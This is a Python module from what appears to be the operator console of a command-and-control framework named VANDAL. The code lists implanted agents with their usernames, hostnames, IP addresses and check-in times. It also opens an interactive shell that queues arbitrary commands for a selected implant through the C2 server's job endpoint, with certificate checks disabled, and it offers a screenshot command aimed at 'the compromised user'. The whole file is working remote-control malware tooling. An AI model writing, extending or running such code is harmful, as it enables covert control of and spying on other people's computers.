from vandal_settings import PORT
import requests
from prettytable import PrettyTable, ALL
from requests.exceptions import RequestException
from colorama import init, Fore, Style
from .__database import *

# The colorama thing
init(autoreset=True)

def get_agent_details(agent_id):
    agent = active_agents.find_one({"agent_id": agent_id}) 
    if agent:
        return {'username': agent['username'], 'hostname': agent['hostname']}
    return None

def list_agents():
    # Grab a list of all the current agents to do the following
    agents = list(active_agents.find({}))

    if not agents:
        print(Fore.RED + "[!] No agents found")
        return

    table = PrettyTable()
    table.field_names = ["IMPLANT ID", "USERNAME", "HOSTNAME", "IP ADDRESS", "LAST PULSE", "SLEEP(s)"]

    for agent in agents:
        last_check_in = agent.get("last_check_in", "Not Checked In")
        sleep_time = agent.get("sleep_time", "UNK")
        table.add_row([
            Fore.BLUE + Style.BRIGHT + agent["agent_id"] + Fore.RESET,
            agent["username"], str(agent["hostname"]), str(agent["ip_address"]), 
            str(last_check_in), str(sleep_time)
        ])
    
    table.hrules = ALL
    table.vrules = ALL
    print(table)

def interact_with_agent(agent_id):
    while True:
        try:
            agent_details = get_agent_details(agent_id)
            if agent_details:
                cmd = input(Fore.RED + f"({agent_details['username']}@{agent_details['hostname']})> " + Fore.RESET).strip()
            else:
                cmd = input(Fore.RED + f"{agent_id}> " + Fore.RESET).strip()
    
            
            #cmd = input(Fore.RED + f"{agent_id} > " + Fore.RESET).strip()
            #cmd = input(Fore.RED + f"({agent_details['username']}@{agent_details['hostname']})> " + Fore.RESET).strip()
            

            if not cmd:
                continue

            if cmd in ["!back", "!help"]:
                agent_commands() if cmd == "!help" else None
                continue

            payload = {
                "command": cmd,
                "agent_id": agent_id
            }
            
            response = requests.post(f'https://127.0.0.1:{PORT}/add_job', json=payload, verify=False)
            
            if response.status_code != 200:
                print(Fore.RED + f"\nError: Unexpected server response. Status Code: {response.status_code}")
                continue

            print(response.json().get("message", Fore.RED + "Error!"))

        except RequestException as e:
            print(Fore.RED + f"Error: Failed to send request. {e}")

def agent_commands():
    print("\nThese commands are intended to be run in the agent shell\n")
    table = PrettyTable()
    table.field_names = ["Command", "Purpose"]

    commands = [
        ("!help", "Show this menu"),
        ("!back", "Return to the VANDAL menu"),
        ("!screenshot", "Captures current screen of the compromised user")
    ]

    for cmd, purpose in commands:
        table.add_row([Fore.RED + cmd + Fore.RESET, purpose])
    
    table.hrules = ALL
    table.vrules = ALL
    print(table)
